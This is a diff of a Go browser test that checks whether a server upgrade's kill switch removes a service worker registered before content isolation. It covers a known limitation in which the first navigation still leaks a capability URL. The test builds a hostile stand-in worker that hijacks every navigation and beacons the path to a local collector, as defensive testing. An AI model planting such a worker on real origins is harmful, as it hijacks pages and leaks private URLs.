@@ -17,30 +17,79 @@ import (
 	"time"
 )
 
-// TestBrowser_UpgradeRemovesPreexistingServiceWorker: a service worker that a
-// page registered on the content origin before the upgrade must stop
-// controlling the origin once the upgraded server answers its update check.
+// TestBrowser_PreexistingServiceWorkerUpgrade covers a service worker that a
+// page registered on the content origin under an affected release, before
+// content isolation. Each subtest keeps one browser profile across several
+// browser runs, so the registration survives the server swap as it would for
+// a real viewer.
 //
-// One browser profile is kept across four browser runs on one fixed origin:
-//
-//  1. A stand-in for a pre-isolation server (which served pages unsandboxed
-//     and any script as a worker) registers a root-scoped worker that answers
-//     every navigation itself. The test confirms it intercepts.
-//  2. The real demiplane takes the same port. Opening a public page there
-//     triggers the browser's own update check of the registered worker; the
-//     test requires the real page to load, not the worker's answer.
-//  3. A password-protected canary, opened with credentials, must be the real
-//     artifact.
-//  4. A stand-in serving one unsandboxed page on the same origin reports the
-//     origin's registrations, which must be gone.
-func TestBrowser_UpgradeRemovesPreexistingServiceWorker(t *testing.T) {
+// The kill switch removes such a worker, but only through the browser's update
+// check, and the browser runs that check after the active worker has handled
+// the navigation that triggered it. So the first navigation after the upgrade
+// is still the old worker's to read. "residual" pins that limitation and the
+// cleanup after it; "fresh content origin" tests the migration procedure that
+// avoids it.
+func TestBrowser_PreexistingServiceWorkerUpgrade(t *testing.T) {
 	chrome := requireChrome(t)
-	col := newCollector(t)
-	profile := t.TempDir()
-	port := freePort(t)
-	origin := "http://127.0.0.1:" + strconv.Itoa(port)
 
-	// 1. Before the upgrade.
+	// Known limitation: the first navigation after the upgrade is answered by
+	// the old worker, and that navigation's URL (here a capability URL) is
+	// disclosed to it. The browser updates the worker as part of it; the kill
+	// switch then unregisters itself and reloads the page from the server, and
+	// later navigations and the registration list are clean.
+	t.Run("residual", func(t *testing.T) {
+		col := newCollector(t)
+		profile := t.TempDir()
+		port := freePort(t)
+		origin := "http://127.0.0.1:" + strconv.Itoa(port)
+		installHostileWorker(t, chrome, col, profile, port)
+
+		srv := startServer(t, serverOpts{Token: "sw-token", ContentPort: port})
+		capPath := publishCanary(t, srv, col, "canary-41ab")
+
+		run := chromeRun(t, chrome, profile, origin+capPath)
+		first := col.wait(t, 30*time.Second)
+		if !strings.Contains(first, `"intercepted":`+jsString(capPath)) {
+			t.Fatalf("expected the old worker to answer the first navigation after the upgrade "+
+				"(the documented limitation); if this changed, update the upgrade notes: %s", first)
+		}
+		t.Logf("known limitation reproduced: the first navigation after the upgrade went to the old worker: %s", first)
+		// The kill switch reloads the page it took over; that load is the server's.
+		waitReport(t, col, `"real":"canary-41ab"`, 30*time.Second)
+		run.stop(t)
+
+		run = chromeRun(t, chrome, profile, origin+capPath)
+		waitReport(t, col, `"real":"canary-41ab"`, 30*time.Second)
+		run.stop(t)
+		srv.Stop()
+
+		assertNoRegistrations(t, chrome, col, profile, port)
+	})
+
+	// The migration procedure: serve the upgraded instance's content plane on
+	// a new origin. The old worker is bound to the old origin and never sees a
+	// navigation on the new one, so the very first visit is the server's.
+	t.Run("fresh content origin", func(t *testing.T) {
+		col := newCollector(t)
+		profile := t.TempDir()
+		installHostileWorker(t, chrome, col, profile, freePort(t))
+
+		srv := startServer(t, serverOpts{Token: "sw-token"}) // a new content port
+		capPath := publishCanary(t, srv, col, "canary-58d0")
+		run := chromeRun(t, chrome, profile, srv.ContentURL+capPath)
+		waitReport(t, col, `"real":"canary-58d0"`, 30*time.Second)
+		run.stop(t)
+	})
+}
+
+// installHostileWorker runs a stand-in for an affected pre-isolation server
+// (pages unsandboxed, any script servable as a worker) on 127.0.0.1:port and
+// has the browser profile register a root-scoped worker there that answers
+// every navigation itself with a page reporting {"intercepted": <path>}. It
+// returns once the worker has been seen intercepting, with the stand-in and
+// the browser stopped.
+func installHostileWorker(t *testing.T, chrome string, col *collector, profile string, port int) {
+	t.Helper()
 	interceptedPage := `<!doctype html><title>intercepted</title><script>new Image().src=` +
 		jsString(col.srv.URL+"/r?d=") + `+encodeURIComponent(JSON.stringify({intercepted:location.pathname}));</script>`
 	hostileWorker := `var page=` + jsString(interceptedPage) + `;
@@ -54,38 +103,40 @@ self.addEventListener('fetch',function(e){
 navigator.serviceWorker.register('/sw.js',{scope:'/'}).then(function(){
   return navigator.serviceWorker.ready;
 }).then(function(){
-  if(navigator.serviceWorker.controller){location.href='/canary';return;}
-  navigator.serviceWorker.addEventListener('controllerchange',function(){location.href='/canary';});
+  if(navigator.serviceWorker.controller){location.href='/probe';return;}
+  navigator.serviceWorker.addEventListener('controllerchange',function(){location.href='/probe';});
 }).catch(function(e){report({installError:String(e)});});
 </script>`
 	before := standIn(t, port, map[string]string{
 		"/install": installPage,
 		"/sw.js":   hostileWorker,
 	})
-	run := chromeRun(t, chrome, profile, origin+"/install")
-	if got := col.wait(t, 30*time.Second); !strings.Contains(got, `"intercepted":"/canary"`) {
-		t.Fatalf("pre-upgrade worker did not take over navigations, so nothing below is tested: %s", got)
+	run := chromeRun(t, chrome, profile, "http://127.0.0.1:"+strconv.Itoa(port)+"/install")
+	if got := col.wait(t, 30*time.Second); !strings.Contains(got, `"intercepted":"/probe"`) {
+		t.Fatalf("the pre-upgrade worker did not take over navigations, so nothing below is tested: %s", got)
 	}
 	run.stop(t)
 	before.Close()
+}
 
-	// 2. The upgraded server on the same origin.
-	srv := startServer(t, serverOpts{Token: "sw-token", ContentPort: port})
-	publishAs(t, srv, "probe", "probe.html", "", `<!doctype html><script>`+reportJS(col.srv.URL)+
-		`report({real:'probe-7d21'});</script>`)
-	publishAs(t, srv, "canary", "canary.html", "pw-5150", `<!doctype html><script>`+reportJS(col.srv.URL)+
-		`report({real:'canary-41ab'});</script>`)
-	run = chromeRun(t, chrome, profile, origin+"/probe")
-	waitReport(t, col, `"real":"probe-7d21"`, 45*time.Second)
-	run.stop(t)
+// publishCanary publishes a private (capability URL) page that reports
+// {"real": marker} and returns its path on the content origin.
+func publishCanary(t *testing.T, srv *testServer, col *collector, marker string) string {
+	t.Helper()
+	body := `<!doctype html><script>` + reportJS(col.srv.URL) + `report({real:` + jsString(marker) + `});</script>`
+	res := srv.do(t, http.MethodPost, srv.ControlURL+"/publish?private=true&filename=canary.html",
+		strings.NewReader(body), srv.authHeader())
+	if res.Status != http.StatusCreated {
+		t.Fatalf("publish private canary: %d %s", res.Status, res.Body)
+	}
+	return strings.TrimPrefix(strings.TrimSpace(string(res.Body)), srv.ContentURL)
+}
 
-	// 3. The protected canary is served by the server, not a worker.
-	run = chromeRun(t, chrome, profile, "http://u:pw-5150@127.0.0.1:"+strconv.Itoa(port)+"/canary")
-	waitReport(t, col, `"real":"canary-41ab"`, 30*time.Second)
-	run.stop(t)
-	srv.Stop()
-
-	// 4. No registration is left on the origin.
+// assertNoRegistrations opens an unsandboxed stand-in page on 127.0.0.1:port
+// with profile and requires that the origin has no service worker
+// registration and the page is not controlled.
+func assertNoRegistrations(t *testing.T, chrome string, col *collector, profile string, port int) {
+	t.Helper()
 	after := standIn(t, port, map[string]string{
 		"/check": `<!doctype html><script>` + reportJS(col.srv.URL) + `
 navigator.serviceWorker.getRegistrations().then(function(rs){
@@ -94,16 +145,17 @@ navigator.serviceWorker.getRegistrations().then(function(rs){
 </script>`,
 	})
 	defer after.Close()
-	run = chromeRun(t, chrome, profile, origin+"/check")
+	run := chromeRun(t, chrome, profile, "http://127.0.0.1:"+strconv.Itoa(port)+"/check")
+	defer run.stop(t)
 	got := waitReport(t, col, `"registrations"`, 30*time.Second)
 	if !strings.Contains(got, `"registrations":0`) || !strings.Contains(got, `"controlled":false`) {
 		t.Fatalf("a service worker is still registered after the upgrade: %s", got)
 	}
-	run.stop(t)
 }
 
-// waitReport waits for a report containing want, failing on an interception
-// report or the timeout. Earlier, unrelated reports are skipped.
+// waitReport waits for a report containing want. It fails at once on a report
+// from the hostile worker's page (one that answered a navigation instead of
+// the server), and on the timeout. Other reports are skipped.
 func waitReport(t *testing.T, col *collector, want string, timeout time.Duration) string {
 	t.Helper()
 	deadline := time.After(timeout)
@@ -112,6 +164,9 @@ func waitReport(t *testing.T, col *collector, want string, timeout time.Duration
 		select {
 		case d := <-col.reports:
 			seen = append(seen, d)
+			if strings.Contains(d, `"intercepted"`) {
+				t.Fatalf("the old worker answered a navigation while waiting for %s: %s (reports: %v)", want, d, seen)
+			}
 			if strings.Contains(d, want) {
 				return d
 			}
